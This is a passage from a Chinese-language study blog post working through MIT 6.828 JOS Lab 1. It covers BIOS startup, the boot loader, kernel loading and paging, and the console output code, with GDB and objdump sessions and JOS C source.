src="https://s2.loli.net/2022/03/15/G8adZYg3pk9lBRr.png" alt="image.png"></p><blockquote><p>为了原汁原味模拟 MIT 实验的感觉，笔者并未装上 pwn 手常用的 pwndbg 插件（其实只是懒 + 怕出现奇怪的问题）</p></blockquote><p>MIT 对这个启动过程总结出如下三点：</p><ul><li><p>IBM PC 启动时执行 0x000ffff0 处代码，这是为 ROM BIOS 保留的内存区域的顶部</p></li><li><p>PC 启动时 <code>CS = 0xf000</code>，<code>IP = 0xfff0</code></p></li><li><p>执行的第一条指令为跳转指令，跳转至<code>CS = 0xf000, IP = 0xe05b</code> 处</p></li></ul><p>为什么QEMU 的启动流程是这样的？这首先是 Intel 设计 8088 处理器的模式，之后被 IBM 用在了最初的 PC 上，这是因为在 PC 上， BIOS 被“硬连线”（hard-wired）到物理地址的 <code>0x0000f0000 - 0x000fffff</code> 处（物理地址起始 64KB），这个设计保证了 BIOS 在启动或是系统重启时总能是第一个拿到机器控制权的，因为此时 RAM 中还没有任何其他的软件可以让处理器运行（笔者认为这是一句废话）。QEMU 自己有着一个 BIOS，在处理器复位后，其处在实模式下，且会将 <code>CS:IP</code> 设置为 <code>0xf000:0xfff0</code>，因此 PC 从此处的代码开始执行——将 CS 寄存器左移 4 位再加上 IP 寄存器便获得了当前执行的代码的地址 <code>0xffff0</code>——20位的地址线撑起了 1MB 的内存空间。</p><blockquote><p>当笔者翻译完 MIT 实验页面的这一段话之后发现这完全没有任何意义——对于二进制人来说这是再基础不过的知识了，因此后面只会酌情引入 MIT 实验文档的翻译，更多的是笔者自己认为有必要写下的笔记，例如上面的这一段话的末尾部分便是笔者自己写的。</p></blockquote><p>接下来看 Exercise 2，主要是让我们尝试跟进调试一下 BIOS，感受一下他会做些什么：</p><blockquote><p>Exercise 2. Use GDB’s si (Step Instruction) command to trace into the ROM BIOS for a few more instructions, and try to guess what it might be doing. You might want to look at <a href="http://web.archive.org/web/20040404164813/members.iweb.net.au/~pstorr/pcbook/book2/book2.htm">http://web.archive.org/web/20040404164813/members.iweb.net.au/~pstorr/pcbook/book2/book2.htm</a>, as well as other materials on the <a href="https://pdos.csail.mit.edu/6.828/2018/reference.html">6.828 reference materials page</a>. No need to figure out all the details - just the general idea of what the BIOS is doing first.</p></blockquote><p>BIOS 主要完成的工作便是设置中断向量表（Interrupt Vector Table，位于 <code>0x000 ~ 0x3fff</code>），初始化一些设备（例如 VGA display），此时显存被映射到 <code>0xa0000 ~ 0xbffff</code>，显示适配器的 BIOS 被加载到 <code>0xc0000 ~ 0xc7fff</code>，此时<strong>我们直接向显存映射区写入内容便可以在屏幕上显示字符</strong></p><p>之后 BIOS 会读出硬盘上的<strong>第一个扇区</strong>到 <code>0x7c00</code> 处，<strong>并跳转到该处</strong>，我们称被载入的第一个扇区为<strong>主引导记录</strong>（Master Boot Record, aka MBR），其从 BIOS 手中接过启动 PC 的接力棒</p><blockquote><p>MIT 原实验文档中写的是 BIOS 将中断描述符表（Interrupt Descriptor Table）载入到内存当中，但笔者认为在<strong>实模式下应当为中断向量表</strong>，这是因为中断描述符是一个属于保护模式下的概念，这里做出改正</p></blockquote><h2 id="Part-2-The-Boot-Loader"><a href="#Part-2-The-Boot-Loader" class="headerlink" title="Part 2: The Boot Loader"></a>Part 2: The Boot Loader</h2><p>通常 PC 的硬盘与软盘上的空间被按照 <code>扇区</code> 进行划分，最常见的扇区大小为 <code>512B</code>，单个扇区也是我们读写磁盘最小的操作单位，若磁盘是可引导的，则第一个扇区称为<strong>引导扇区</strong>，因为该扇区中存放着 <em>引导加载程序</em> 的代码，BIOS 在 PC 启动后完成其工作后会将该扇区读到内存中的 <code>0x7c00 ~ 0x7fff</code> 处，之后使用一个 <code>jmp</code> 跳转指令跳转至 <code>CS:IP = 0000:7C00</code>，将控制权交给这一部分代码</p><blockquote><p>MIT 文档认为，这个地址是相当随意的，<strong>但经笔者考证这是一个有来头的地址</strong>，参见<a href="https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/#%E4%B8%80%E3%80%81%E5%AE%9E%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80">【CODE.0x00】从零开始的32位操作系统开发手记 - arttnba3’s blog</a></p></blockquote><p>由于 CD-ROM 的出现在 PC 发展史中较晚，这给了 PC 架构师足够的时间去重新思考并设计功能更加强大的引导方式，CD-ROM 通常使用 <code>2048B</code> 的扇区大小，且 BIOS 会将更多的扇区作为引导映像载入内存中，这部分内容可以参见<a href="https://pdos.csail.mit.edu/6.828/2018/readings/boot-cdrom.pdf">“El Torito” Bootable CD-ROM Format Specification</a></p><p>6.828 的 boot loader 包含两个文件：<code>boot/boot.S</code> 与 <code>boot/main.c</code>，其完成以下两个工作：</p><ul><li><p>将处理器<strong>从实模式切换到保护模式</strong>（boot.S）</p><ul><li><p>打开 A20-Gate 以支持大于 1MB 的地址空间</p></li><li><p>加载全局段描述符表</p></li><li><p>设置 cr0 寄存器对应标志位，进入保护模式</p></li></ul></li><li><p>通过 x86 的特殊 I&#x2F;O 指令从磁盘上读取内核并将之载入内存，跳转到内核（boot.c）</p><ul><li><p>通过 <code>in</code> 与 <code>out</code> 这两条指令读取磁盘数据</p></li><li><p>检查并分析 ELF header，跳转到内核</p></li></ul></li></ul><p>在大二下学习操作系统课程时笔者有幸尝试亲手写过一个内核（虽然远没有完成），其中就包括写 loader，因此这一部分笔者还是相对较为熟悉的，不过 MIT 代码的精炼程度远非笔者从 <em>另一本书上抄抄改改而来的代码</em> 所能比拟的，推荐大家仔细阅读（笑）</p><p>下面看 Exercise 3，主要是参照 6.828 的手册学习 GDB，这里就不贴过程了：</p><blockquote><p>Exercise 3. Take a look at the <a href="https://pdos.csail.mit.edu/6.828/2018/labguide.html">lab tools guide</a>, especially the section on GDB commands. Even if you’re familiar with GDB, this includes some esoteric GDB commands that are useful for OS work.</p><p>Set a breakpoint at address 0x7c00, which is where the boot sector will be loaded. Continue execution until that breakpoint. Trace through the code in boot&#x2F;boot.S, using the source code and the disassembly file obj&#x2F;boot&#x2F;boot.asm to keep track of where you are. Also use the x&#x2F;i command in GDB to disassemble sequences of instructions in the boot loader, and compare the original boot loader source code with both the disassembly in obj&#x2F;boot&#x2F;boot.asm and GDB.</p><p>Trace into bootmain() in boot&#x2F;main.c, and then into readsect(). Identify the exact assembly instructions that correspond to each of the statements in readsect(). Trace through the rest of readsect() and back out into bootmain(), and identify the begin and end of the for loop that reads the remaining sectors of the kernel from the disk. Find out what code will run when the loop is finished, set a breakpoint there, and continue to that breakpoint. Then step through the remainder of the boot loader.</p></blockquote><p>6.828 还提供给我们一份反编译后的 loader 文件，位于 <code>obj/boot/boot.asm</code>，为上面两个文件编译后在内存中的样子，并附上了贴心的注释，推荐大家配合着这份文件进行调试，<strong>极致享受</strong>（笑）</p><p><img src="https://s2.loli.net/2022/02/20/pGUmRero8DqvH5j.png" alt="imagepng"></p><p>接下来解决一些 6.828 的习题：</p><ul><li><p>At what point does the processor start executing 32-bit code? What exactly causes the switch from 16- to 32-bit mode?</p><ul><li><p>在 <code>boot.main.c</code> 中的 bootmain() 中通过 <code>((void (*)(void)) (ELFHDR-&gt;e_entry))();</code> 跳转到内核入口点</p></li><li><p>当 MBR 设置了 cr0 寄存器的 <code>PE</code> 标志位后，处理器从实模式进入到保护模式，对应的汇编代码为 <code>ljmp $0x8,$0x7c32</code>，<strong>这是在加载了全局段描述符表后使用代码段描述符完成的一个跳转指令</strong></p><p><img src="https://s2.loli.net/2022/02/20/bDBS7YIQpKEAlqJ.png" alt="imagepng"></p></li></ul></li><li><p>What is the <em>last</em> instruction of the boot loader executed, and what is the <em>first</em> instruction of the kernel it just loaded?</p><ul><li><p>boot loader 执行的最后一条指令为<code>((void (*)(void)) (ELFHDR-&gt;e_entry))();</code>，对应汇编代码 <code>call *0x10018</code>——这是 kernel 的入口点，而 kernel 执行的第一条指令为 <code>movw $0x1234, 0x472</code></p><p><img src="https://s2.loli.net/2022/02/20/DHyfhqPj7NgbsT6.png" alt="imagepng"></p></li></ul></li><li><p><em>Where</em> is the first instruction of the kernel?</p><ul><li>kernel 的第一条指令在其 ELF 入口点标注的位置，这里是 <code>0x10018</code></li></ul></li><li><p>How does the boot loader decide how many sectors it must read in order to fetch the entire kernel from disk? Where does it find this information?</p><ul><li>loader 首先会从磁盘上读取前面一张页的内容（大小0x1000），在判断这是一个合法的 ELF header 之后解析其节表（其中包含每一节（section，也称段（segment））的相关信息，包括该段在文件内的偏移（p_offset）、在内存中的加载地址（p_vaddr）、在文件中的大小（p_filesz）、该段在内存中的大小（p_memsz）、该段的标志位（p_flags，主要标识 rwx 权限）），根据节表信息从磁盘上读取数据</li></ul></li></ul><h3 id="Loading-the-Kernel"><a href="#Loading-the-Kernel" class="headerlink" title="Loading the Kernel"></a>Loading the Kernel</h3><p>首先看 Exercise 4，主要是<strong>复习</strong>你的 C 语言知识，尤其是关于指针的那一部分（笑），这一块可以参考大名鼎鼎的 K&amp;R C，以及装载链接ELF文件等基础知识，笔者推荐阅读《程序员的自我修养》</p><blockquote><p>Exercise 4. Read about programming with pointers in C. The best reference for the C language is <em>The C Programming Language</em> by Brian Kernighan and Dennis Ritchie (known as ‘K&amp;R’). We recommend that students purchase this book (here is an <a href="http://www.amazon.com/C-Programming-Language-2nd/dp/0131103628/sr=8-1/qid=1157812738/ref=pd_bbs_1/104-1502762-1803102?ie=UTF8&s=books">Amazon Link</a>) or find one of <a href="http://library.mit.edu/F/AI9Y4SJ2L5ELEE2TAQUAAR44XV5RTTQHE47P9MKP5GQDLR9A8X-10422?func=item-global&doc_library=MIT01&doc_number=000355242&year=&volume=&sub_library=">MIT’s 7 copies</a>.</p><p>Read 5.1 (Pointers and Addresses) through 5.5 (Character Pointers and Functions) in K&amp;R. Then download the code for <a href="https://pdos.csail.mit.edu/6.828/2018/labs/lab1/pointers.c">pointers.c</a>, run it, and make sure you understand where all of the printed values come from. In particular, make sure you understand where the pointer addresses in printed lines 1 and 6 come from, how all the values in printed lines 2 through 4 get there, and why the values printed in line 5 are seemingly corrupted.</p><p>There are other references on pointers in C (e.g., <a href="https://pdos.csail.mit.edu/6.828/2018/readings/pointers.pdf">A tutorial by Ted Jensen</a> that cites K&amp;R heavily), though not as strongly recommended.</p><p><em>Warning:</em> Unless you are already thoroughly versed in C, do not skip or even skim this reading exercise. If you do not really understand pointers in C, you will suffer untold pain and misery in subsequent labs, and then eventually come to understand them the hard way. Trust us; you don’t want to find out what “the hard way” is.</p></blockquote><p>接下来是 Exercise 5，主要是改 Makefile 文件中指定的链接地址然后重新调试体验一下，这里就跳过了</p><blockquote><p>Exercise 5. Trace through the first few instructions of the boot loader again and identify the first instruction that would “break” or otherwise do the wrong thing if you were to get the boot loader’s link address wrong. Then change the link address in boot&#x2F;Makefrag to something wrong, run make clean, recompile the lab with make, and trace into the boot loader again to see what happens. Don’t forget to change the link address back and make clean again afterward!</p></blockquote><p>最后是 Exercise 6，使用 GDB 指令在 BIOS 将控制权交给 MBR 时查看内存 <code>0x00100000</code> 处的数据</p><blockquote><p>Exercise 6. We can examine memory using GDB’s x command. The <a href="https://sourceware.org/gdb/current/onlinedocs/gdb/Memory.html">GDB manual</a> has full details, but for now, it is enough to know that the command x&#x2F;<em>N</em>x <em>ADDR</em> prints <em>N</em> words of memory at <em>ADDR</em>. (Note that both ‘x’s in the command are lowercase.) <em>Warning</em>: The size of a word is not a universal standard. In GNU assembly, a word is two bytes (the ‘w’ in xorw, which stands for word, means 2 bytes).</p><p>Reset the machine (exit QEMU&#x2F;GDB and start them again). Examine the 8 words of memory at 0x00100000 at the point the BIOS enters the boot loader, and then again at the point the boot loader enters the kernel. Why are they different? What is there at the second breakpoint? (You do not really need to use QEMU to answer this question. Just think.)</p></blockquote><p>虽然要求只看 8 个 word，但是笔者还是习惯多看一些（笑），这里可以看到在刚刚运行到 MBR 时该处数据都是0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs gdb">The target architecture is set to &quot;i8086&quot;.<br>[f000:fff0]    0xffff0:    ljmp   $0xf000,$0xe05b<br>0x0000fff0 in ?? ()<br>+ symbol-file obj/kern/kernel<br>(gdb) x /20gx 0x00100000 <br>0x100000:    0x0000000000000000    0x0000000000000000<br>0x100010:    0x0000000000000000    0x0000000000000000<br>0x100020:    0x0000000000000000    0x0000000000000000<br>0x100030:    0x0000000000000000    0x0000000000000000<br>0x100040:    0x0000000000000000    0x0000000000000000<br>0x100050:    0x0000000000000000    0x0000000000000000<br>0x100060:    0x0000000000000000    0x0000000000000000<br>0x100070:    0x0000000000000000    0x0000000000000000<br>0x100080:    0x0000000000000000    0x0000000000000000<br>0x100090:    0x0000000000000000    0x0000000000000000<br>(gdb) b *0x7c00<br>Breakpoint 1 at 0x7c00<br>(gdb) c<br>Continuing.<br>[   0:7c00] =&gt; 0x7c00:    cli    <br><br>Breakpoint 1, 0x00007c00 in ?? ()<br>(gdb) x /20gx 0x00100000 <br>0x100000:    0x0000000000000000    0x0000000000000000<br>0x100010:    0x0000000000000000    0x0000000000000000<br>0x100020:    0x0000000000000000    0x0000000000000000<br>0x100030:    0x0000000000000000    0x0000000000000000<br>0x100040:    0x0000000000000000    0x0000000000000000<br>0x100050:    0x0000000000000000    0x0000000000000000<br>0x100060:    0x0000000000000000    0x0000000000000000<br>0x100070:    0x0000000000000000    0x0000000000000000<br>0x100080:    0x0000000000000000    0x0000000000000000<br>0x100090:    0x0000000000000000    0x0000000000000000<br>(gdb) <br></code></pre></td></tr></table></figure><p>接下来在进入内核时再次查看此处数据，发现已经被覆盖上了新的数据，主要是内核的汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs gdb">Breakpoint 1, 0x00007d81 in ?? ()<br>(gdb) x /20gx 0x00100000 <br>0x100000:    0x000000001badb002    0x7205c766e4524ffe<br>0x100010:    0x2000b81234000004    0xc0200fd8220f0011<br>0x100020:    0xc0220f800100010d    0xbde0fff010002fb8<br>0x100030:    0x110000bc00000000    0xfeeb0000006ce8f0<br>0x100040:    0x56e58955fb1e0ff3    0xc3810000017ee853<br>0x100050:    0x8308758b000112ba    0xff0778838d5608ec<br>0x100060:    0x8300000a03e850ff    0xec83297ef68510c4<br>0x100070:    0xffc6e850ff468d0c    0x08ec8310c483ffff<br>0x100080:    0x50ffff0794838d56    0x10c483000009dde8<br>0x100090:    0x83c35d5e5bf8658d    0x006a006a006a04ec<br>(gdb) <br></code></pre></td></tr></table></figure><p>这里我们注意到一个数字<code>0x1badb002</code>——<strong>这是 Multiboot Specification 标准要求的一个位于 header 的 magic number</strong>，在启动时会校验这个数，详情可以参见 <a href="https://www.gnu.org/software/grub/manual/multiboot/multiboot.html">https://www.gnu.org/software/grub/manual/multiboot/multiboot.html</a></p><h2 id="Part-3-The-Kernel"><a href="#Part-3-The-Kernel" class="headerlink" title="Part 3: The Kernel"></a>Part 3: The Kernel</h2><p>在本部分中我们将开始学习 JOS 的最小实现的细节，并<strong>开始写一些代码</strong>。如同 boot loader 一般，内核在一开始也先执行一些汇编代码，以让 C 代码能恰当地执行</p><h3 id="Using-virtual-memory-to-work-around-position-dependence"><a href="#Using-virtual-memory-to-work-around-position-dependence" class="headerlink" title="Using virtual memory to work around position dependence"></a>Using virtual memory to work around position dependence</h3><p>MBR 的链接地址于加载地址完全匹配，因为其运行在实模式下，<del>他的一切都很真！实模式主打的就是真实！</del>，但内核的加载地址与链接地址却存在<strong>相当大的差别，OS 更倾向于被链接到一个更高的虚拟地址上运行，但其实际则位于物理低地址</strong></p><p>接下来我们使用 <code>objdump</code> 查看编译出的内核 ELF 文件来验证这个结论，结果如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">objdump -h ./obj/kern/kernel</span><br><br>./obj/kern/kernel:     file format elf32-i386<br><br>Sections:<br>Idx Name          Size      VMA       LMA       File off  Algn<br>  0 .text         00001a7f  f0100000  00100000  00001000  2**4<br>                  CONTENTS, ALLOC, LOAD, READONLY, CODE<br>  1 .rodata       000006bc  f0101a80  00101a80  00002a80  2**5<br>                  CONTENTS, ALLOC, LOAD, READONLY, DATA<br>  2 .stab         00004219  f010213c  0010213c  0000313c  2**2<br>                  CONTENTS, ALLOC, LOAD, READONLY, DATA<br>  3 .stabstr      0000198a  f0106355  00106355  00007355  2**0<br>                  CONTENTS, ALLOC, LOAD, READONLY, DATA<br>  4 .data         00009300  f0108000  00108000  00009000  2**12<br>                  CONTENTS, ALLOC, LOAD, DATA<br>  5 .got          00000008  f0111300  00111300  00012300  2**2<br>                  CONTENTS, ALLOC, LOAD, DATA<br>  6 .got.plt      0000000c  f0111308  00111308  00012308  2**2<br>                  CONTENTS, ALLOC, LOAD, DATA<br>  7 .data.rel.local 00001000  f0112000  00112000  00013000  2**12<br>                  CONTENTS, ALLOC, LOAD, DATA<br>  8 .data.rel.ro.local 00000044  f0113000  00113000  00014000  2**2<br>                  CONTENTS, ALLOC, LOAD, DATA<br>  9 .bss          00000648  f0113060  00113060  00014060  2**5<br>                  CONTENTS, ALLOC, LOAD, DATA<br> 10 .comment      00000023  00000000  00000000  000146a8  2**0<br>                  CONTENTS, READONLY<br></code></pre></td></tr></table></figure><p>VMA 为虚拟地址，LMA 为加载地址，可见确实如此。这是因为当 OS kernel 被运行在较高的虚拟地址时，其可以很方便地将虚拟地址空间的低地址部分留给用户程序使用，<strong>但通常大部分 32 位机器并没有足够大的内存，他们在 0xf0100000 处往往没有任何物理内存</strong>，因此我们需要实现<strong>虚拟地址到物理地址的映射</strong>，这需要借助页表的帮助。</p><p>在设置 cr0 寄存器的 <code>PG</code> 标志位前，我们的内存管理模式是<strong>分段</strong>模式，此时我们对内存的访问使用的是<strong>线性地址</strong>（linear address）——由段选择子与段描述符表来描述分段，完成线性地址到物理地址的映射；在设置了 cr0 寄存器的 <code>PG</code> 标志位之后，我们对内存访问使用的就是<strong>虚拟地址</strong>（virtual）——由页表描述虚拟地址空间到物理地址空间的映射，并由 MMU 完成翻译</p><p>32位下最常用的是二级页表，6.828 十分贴心地在 <code>kern/entrypgdir.c</code> 中手写了一个静态初始化的页表结构，设置了虚拟地址 <code>0xf0000000 ~ 0xf0400000</code> 到物理地址 <code>0x00000000 ~ 0x00400000</code> 映射，以及虚拟地址 <code>0x00000000 ~ 0x00400000</code> 到物理地址 <code>0x00000000 ~ 0x00400000</code> 映射。</p><p>若我们尝试访问不属于这两个地址范围的地址，则会触发缺页中断，由于我们尚未设置对应的中断处理程序，因此会导致 QEMU crash 并退出</p><p>接下来是 Exercise 7，查看分页机制开启前后 <code>0x00100000</code> 与 <code>0xf0100000</code> 这两个地址上的数据</p><blockquote><p>Exercise 7. Use QEMU and GDB to trace into the JOS kernel and stop at the <code>movl %eax, %cr0</code>. Examine memory at 0x00100000 and at 0xf0100000. Now, single step over that instruction using the stepi GDB command. Again, examine memory at 0x00100000 and at 0xf0100000. Make sure you understand what just happened.</p><p>What is the first instruction <em>after</em> the new mapping is established that would fail to work properly if the mapping weren’t in place? Comment out the <code>movl %eax, %cr0</code> in kern&#x2F;entry.S, trace into it, and see if you were right.</p></blockquote><p>结果如下，在成功建立页表映射之后这两个地址的数据是一致的，因为<strong>完成映射后这两个虚拟地址空间指向同一物理地址空间</strong>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs shell">(gdb) <br>=&gt; 0x10001d:    mov    %cr0,%eax<br>0x0010001d in ?? ()<br>(gdb) si<br>=&gt; 0x100020:    or     $0x80010001,%eax<br>0x00100020 in ?? ()<br>(gdb) x /8x 0x00100000<br>0x100000:    0x1badb002    0x00000000    0xe4524ffe    0x7205c766<br>0x100010:    0x34000004    0x2000b812    0x220f0011    0xc0200fd8<br>(gdb) x /8x 0xf0100000<br>0xf0100000 &lt;_start-268435468&gt;:    0x00000000    0x00000000    0x00000000    0x00000000<br>0xf0100010 &lt;entry+4&gt;:    0x00000000    0x00000000    0x00000000    0x00000000<br>(gdb) si<br>=&gt; 0x100025:    mov    %eax,%cr0<br>0x00100025 in ?? ()<br>(gdb) <br>=&gt; 0x100028:    mov    $0xf010002f,%eax<br>0x00100028 in ?? ()<br>(gdb) x /8x 0x00100000<br>0x100000:    0x1badb002    0x00000000    0xe4524ffe    0x7205c766<br>0x100010:    0x34000004    0x2000b812    0x220f0011    0xc0200fd8<br>(gdb) x /8x 0xf0100000<br>0xf0100000 &lt;_start-268435468&gt;:    0x1badb002    0x00000000    0xe4524ffe    0x7205c766<br>0xf0100010 &lt;entry+4&gt;:    0x34000004    0x2000b812    0x220f0011    0xc0200fd8<br>(gdb) <br></code></pre></td></tr></table></figure><h3 id="Formatted-Printing-to-the-Console"><a href="#Formatted-Printing-to-the-Console" class="headerlink" title="Formatted Printing to the Console"></a>Formatted Printing to the Console</h3><p>这部分要求我们阅读 <code>kern/printf.c, lib/printfmt.c, kern/console.c</code> 以了解 xv6 向控制台输出字符的实现。在正式开始阅读代码之前，我们先自行思考一下：如何在一块 80 * 24 的屏幕上实现各种各样的输出功能？</p><p>我们不难想到，所有的输出操作最终都可以通过使用一个“输出原语”实现——「输出单个字符」，我们在实现其他的输出功能，例如 printf 或是 puts 时，只需要在这些函数内部多次调用这个输出原语即可。</p><p>这个输出原语应当完成如下功能：</p><ul><li><p>在屏幕光标处输出字符，并适当移动光标（例如普通字符则将光标向后移动一个字符，而 <code>\b</code> 则将光标向前移动一个字符， <code>\n</code> 则将光标移到下一行）</p></li><li><p>控制输出字符的颜色</p></li><li><p>完成基础的换行功能，当屏幕被字符填充满时进行滚屏</p></li></ul><p>前面我们讲到，在 BIOS 时期<strong>有一部分显存被映射到内存当中，其实我们只需要直接往显存上写入数据即可控制屏幕输出</strong>，因此最终涉及到与显卡交互的其实只有光标</p><p><code>0xB800~0xBFFF</code> 这块区域是供文本模式使用的显存，当我们在显存内的相应位置写入数据时，屏幕上就会出现对应的字符，在文本模式下显示器支持 <code>80 x 25</code> 16 色文本显示的窗口，一个字符占用两个字节：<strong>第一个字节为 ASCII 码，第二个字节为颜色信息</strong></p><p>现在我们来看 xv6 的源码，其使用一个 <code>cons_putc()</code> 函数实现了这个字符输出原语，定义于 <code>kern/console.c</code> 中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// output a character to the console</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">cons_putc</span><span class="hljs-params">(<span class="hljs-type">int</span> c)</span><br>&#123;<br>    serial_putc(c);<br>    lpt_putc(c);<br>    cga_putc(c);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们看到其最终调用三个函数：<code>serial_putc()</code>、<code>lpt_putc()</code>、<code>cga_putc()</code>，咋一看有些一头雾水，看函数名后缀似乎这三个函数都是用来输出单个字符的？</p><p>先看第一个函数 <code>serial_putc()</code>，其中调用了 <code>inb()</code> 和 <code>outb()</code> 两个函数，这是两个封装好的用以操作端口的函数，展开以后其实就是内联汇编写的 <code>inb</code> 和 <code>outb</code> 指令，单位都是字节</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//...</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COM_TX        0    <span class="hljs-comment">// Out: Transmit buffer (DLAB=0)</span></span><br><span class="hljs-comment">//...</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COM_LSR        5    <span class="hljs-comment">// In:    Line Status Register</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>   COM_LSR_DATA    0x01    <span class="hljs-comment">//   Data available</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>   COM_LSR_TXRDY    0x20    <span class="hljs-comment">//   Transmit buffer avail</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>   COM_LSR_TSRE    0x40    <span class="hljs-comment">//   Transmitter off</span></span><br><span class="hljs-comment">//...</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">serial_putc</span><span class="hljs-params">(<span class="hljs-type">int</span> c)</span><br>&#123;<br>    <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>;<br>         !(inb(COM1 + COM_LSR) &amp; COM_LSR_TXRDY) &amp;&amp; i &lt; <span class="hljs-number">12800</span>;<br>         i++)<br>        delay();<br><br>    outb(COM1 + COM_TX, c);<br>&#125;<br><br><span class="hljs-comment">// inc/x86.h</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">uint8_t</span><br><span class="hljs-title function_">inb</span><span class="hljs-params">(<span class="hljs-type">int</span> port)</span><br>&#123;<br>    <span class="hljs-type">uint8_t</span> data;<br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span><span class="hljs-params">(<span class="hljs-string">&quot;inb %w1,%0&quot;</span> : <span class="hljs-string">&quot;=a&quot;</span> (data) : <span class="hljs-string">&quot;d&quot;</span> (port))</span>;<br>    <span class="hljs-keyword">return</span> data;<br>&#125;<br><br><span class="hljs-comment">// inc/x86.h</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">outb</span><span class="hljs-params">(<span class="hljs-type">int</span> port, <span class="hljs-type">uint8_t</span> data)</span><br>&#123;<br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span><span class="hljs-params">(<span class="hljs-string">&quot;outb %0,%w1&quot;</span> : : <span class="hljs-string">&quot;a&quot;</span> (data), <span class="hljs-string">&quot;d&quot;</span> (port))</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>那么我们可以知道其主要功能就是从 <code>Line Status Register</code> 中读取数据，若不为 <code>COM_LSR_TXRDY</code> 则重试（最多 12800次），否则说明 <code>Transmit buffer</code> 已就绪，之后便向 <code>Transmit buffer</code> 中写入我们要输出的字符</p><p>这里调用了一个 delay 函数，主要是由于历史遗留问题从而需要显式地从 0x84 端口中读取 4 次 1 字节</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Stupid 